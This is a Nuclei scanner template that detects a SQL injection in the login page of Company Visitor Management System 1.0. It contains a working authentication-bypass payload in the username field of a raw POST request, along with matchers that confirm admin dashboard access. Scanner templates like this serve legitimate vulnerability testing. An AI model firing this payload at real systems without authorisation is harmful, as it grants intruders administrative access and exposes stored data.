id: cvms-sqli
info:
  name: Company Visitor Management System 1.0 - SQL Injection
  author: arafatansari
  severity: critical
  description: The Company Visitor Management System 1.0 has a SQL injection vulnerability
    that allows attackers to gain access to sensitive information, modify data, and
    perform unauthorized administrative operations through the login page's username
    parameter.
  reference:
  - https://www.exploit-db.com/exploits/48884
  - https://packetstormsecurity.com/files/158476/Company-Visitor-Management-System-CVMS-1.0-SQL-Injection.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    impact: The SQL injection vulnerability in Company Visitor Management System 1.0
      could result in an attacker gaining access to sensitive information, modifying
      data, and performing unauthorized actions on the affected website.
    recommendation: It is recommended that Company Visitor Management System 1.0 address
      and fix the SQL injection vulnerability in the login page of their system to
      prevent potential security threats.
  tags: cvms,sqli,auth-bypass,cms,edb,packetstorm
requests:
- raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin%27+or+%271%27%3D%271%27%23&password=nuclei&login=

    '
  host-redirects: true
  max-redirects: 2
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Admin user
    - Dashboard
    - CVMS
    condition: and
  - type: status
    status:
    - 200
